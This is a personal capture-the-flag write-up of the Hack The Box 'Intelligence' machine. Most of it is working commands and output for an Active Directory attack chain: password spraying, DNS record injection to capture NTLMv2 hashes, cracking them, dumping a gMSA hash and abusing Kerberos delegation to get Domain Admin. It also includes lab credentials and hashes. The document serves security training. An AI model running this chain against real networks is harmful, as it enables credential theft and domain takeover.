
https://www.hackthebox.com/achievement/machine/1777380/357
## Attack Path:
- **Enumerate internal documents** on the web server to retrieve **usernames and a default password**.

- **Password spraying** leads to the discovery of a **valid user account**.

- **Accessing SMB shares** reveals a **PowerShell script** that makes authenticated web requests.

- **DNS manipulation** forces NTLM authentication to an attacker-controlled machine, capturing **NetNTLMv2 hashes**.

- **Cracking NTLMv2** reveals credentials of a **higher-privileged user**.

- This user can retrieve the **password of a gMSA account**.

- The **gMSA has constrained delegation** over the **Domain Controller**.

- **Kerberos delegation abuse (S4U2Self + S4U2Proxy)** allows privilege escalation to **Domain Admin**.
---
- S4U2Self (Service for User to Self) – Requesting a Ticket on Behalf of Any User
- S4U2Proxy (Service for User to Proxy) – Using That Ticket to Access Another Service
---

## Enumeration
```bash
┌──(pwn㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- -T4 10.10.10.248
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos 
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb
intelligence.htb
DNS:dc.intelligence.htb

_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
for kerbrous.


```
-check http://http://10.10.10.248/
-http://10.10.10.248/documents/2020-12-15-upload.pdf
check form seq of date-upload.pdf
```bash
-wget all pdfs possibles
┌──(pwn㉿kali)-[~/Intelligence]
└─$ exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq > userlist

==> 2020-06-04-upload.txt <==
New Account Guide

==> 2020-12-30-upload.txt <==
Internal IT Update

┌──(pwn㉿kali)-[~/Intelligence]
└─$ cat 2020-{06-04,12-30}-upload.txt
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.


```
-userlists being extracted exiftool
- NewIntelligenceCorpUser9876  : userlists
```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ sudo ./kerbrute userenum -d intelligence.htb --dc dc.intelligence.htb /home/pwn/Intelligence/userlist 



──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ sudo ./kerbrute passwordspray -d intelligence.htb --dc dc.intelligence.htb /home/pwn/intelligence/userlist NewIntelligenceCorpUser9876



```

---
```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ crackmapexec smb 10.10.10.248 -u "Tiffany.Molina" -p "NewIntelligenceCorpUser9876" -d intelligence.htb

SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 


```

```bash
bloodhound-python -d intelligence.htb -c all -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -ns 10.10.10.248 --zip
```

```bash
┌──(pwn㉿kali)-[~/Intelligence]
└─$ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares -Mspider_plus

SPIDER_P... 10.10.10.248    445    DC               [*]     OUTPUT: /tmp/cme_spider_plus

┌──(pwn㉿kali)-[/tmp/cme_spider_plus]
└─$ cat 10.10.10.248.json
IT": {
        "downdetector.ps1": {
```

```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 smbclient.py Tiffany.Molina:NewIntelligenceCorpUser9876@10.10.10.248

# shares

# use users
in desktop of Tiffany.Molina
# cat user.txt
FLAG.TXT HERE

```
![[Pasted image 20250224215158.png]]
-Ted.Graves user found

```bash
# shares
ADMIN$
C$
IPC$
IT
NETLOGON
SYSVOL
Users
# use IT
# ls
drw-rw-rw-          0  Mon Apr 19 00:50:58 2021 .
drw-rw-rw-          0  Mon Apr 19 00:50:58 2021 ..
-rw-rw-rw-       1046  Mon Apr 19 00:50:58 2021 downdetector.ps1
# 

```
---

```
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}

```
## Post-exploitation

```bash
dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.10.10.248 \
-a add -r web1 -d 10.10.14.5 -t A

```
**DNS Record Injection**
- The tool **adds a fake DNS A record** (`web1.intelligence.htb -> 10.10.14.58`) in the AD-integrated DNS server.
- Now, if a machine on the domain resolves `web1.intelligence.htb`, it will get `10.10.14.5` (my Kali box) instead of the real server.

-downdetector.ps1 <> RUNS <> EVERY 5 MINS!!! 

https://github.com/dirkjanm/krbrelayx


---
```bash
┌──(pwn㉿kali)-[~/krbrelayx]
└─$ python3 dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.10.10.248 \
-a add -r webahmad -d 10.10.14.5 -t A


──(pwn㉿kali)-[~/krbrelayx]
└─$ sudo responder -I tun0

```

![[Pasted image 20250224221343.png]]

```bash
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:f525115a6e4ffde7:3803961E5AF4ECA29E621D7EB45DBF07:0101000000000000F5A052263387DB011FA9F73D428C58AD0000000002000800310045004700460001001E00570049004E002D004F00310039004D0043005600490058005000570055000400140031004500470046002E004C004F00430041004C0003003400570049004E002D004F00310039004D0043005600490058005000570055002E0031004500470046002E004C004F00430041004C000500140031004500470046002E004C004F00430041004C000800300030000000000000000000000000200000491C810C2C1547C5761F964CC7DC6DDACDCC2E0C2DF1483E6989C0A90353C9660A001000000000000000000000000000000000000900340048005400540050002F0077006500620031002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000    
```

---
```bash
┌──(pwn㉿kali)-[~/Intelligence]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Mr.Teddy         (Ted.Graves)     

```

![[Pasted image 20250224224323.png]]

![[Pasted image 20250224224408.png]]

```bash
gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb'

```

---
https://github.com/micahvandeusen/gMSADumper

```bash
┌──(pwn㉿kali)-[~/gMSADumper]
└─$ python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb'
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::e9f3d5cf435cdf04a6d56ddc20389c17
svc_int$:aes256-cts-hmac-sha1-96:4592b77392b8e9b1916fc19864481b0d24663f3add6ab0e3c973f9d0e2add81a
svc_int$:aes128-cts-hmac-sha1-96:b8900ed82c96867771e5ee67caaf5a2f


```
  -HASH
```
e9f3d5cf435cdf04a6d56ddc20389c17
```
-we can generate silver ticket

```
sudo ntpdate -u 10.10.10.248
sudo systemctl stop systemd-timesyncd
sudo systemctl start systemd-timesyncd


```

---

```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 getPac.py -targetUser administrator intelligence.htb/Ted.Graves:Mr.Teddy


Domain SID: S-1-5-21-4210132550-3389855604-3437519686

svc_int


┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ sudo python3 ticketer.py -spn svc_int/dc.intelligence.htb -user-id 500 Administrator -nthash e9f3d5cf435cdf04a6d56ddc20389c17 -domain-sid S-1-5-21-4210132550-3389855604-3437519686 -domain intelligence.htb

[*] Saving ticket in Administrator.ccache

```

```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ export KRB5CCNAME=Administrator.ccache
                                                                                                                          
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ klist
Ticket cache: FILE:Administrator.ccache
Default principal: Administrator@INTELLIGENCE.HTB

Valid starting       Expires              Service principal
02/25/2025 04:01:55  02/23/2035 04:01:55  svc_int/dc.intelligence.htb@INTELLIGENCE.HTB
        renew until 02/23/2035 04:01:55



```

---
failed 
```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ crackmapexec smb 10.10.10.248 -u svc_int$ -H e9f3d5cf435cdf04a6d56ddc20389c17

```
---
```bash
──(pwn㉿kali)-[~]
└─$ sudo python3 /usr/share/doc/python3-impacket/examples/getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :e9f3d5cf435cdf04a6d56ddc20389c17                           

```

```bash
┌──(pwn㉿kali)-[~]
└─$ sudo python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -k -no-pass dc.intelligence.htb
```

![[Pasted image 20250224234340.png]]

![[Pasted image 20250224234357.png]]


